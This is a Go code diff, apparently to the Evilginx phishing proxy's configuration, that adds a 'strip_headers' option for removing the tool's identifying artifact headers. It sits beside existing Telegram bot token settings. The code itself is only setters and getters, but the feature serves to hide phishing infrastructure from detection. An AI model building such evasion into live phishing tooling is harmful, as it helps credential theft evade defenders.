@@ -77,6 +77,7 @@ type GeneralConfig struct {
 
 	Chatid    string `mapstructure:"chatid" json:"chatid" yaml:"chatid"`
 	Teletoken string `mapstructure:"teletoken" json:"teletoken" yaml:"teletoken"`
+	StripHeaders bool `mapstructure:"strip_headers" json:"strip_headers" yaml:"strip_headers"`
 }
 
 type Config struct {
@@ -851,4 +852,30 @@ func (c *Config) SetTeletoken(token string) {
     c.cfg.Set(CFG_GENERAL, c.general)
     log.Info("Telegram Bot Token set to: %s", token)
     c.cfg.WriteConfig()
+}
+
+// =============================================================================
+// New functions added below
+// =============================================================================
+
+func (c *Config) SetStripHeaders(enabled bool) {
+    c.general.StripHeaders = enabled
+    c.cfg.Set(CFG_GENERAL, c.general)
+    if enabled {
+        log.Info("header stripping enabled - all Evilginx artifact headers will be removed")
+    } else {
+        log.Info("header stripping disabled")
+    }
+    c.cfg.WriteConfig()
+}
+
+func (c *Config) IsStripHeadersEnabled() bool {
+    return c.general.StripHeaders
+}
+
+func (c *Config) GetStripHeadersStatus() string {
+    if c.general.StripHeaders {
+        return "on"
+    }
+    return "off"
 }
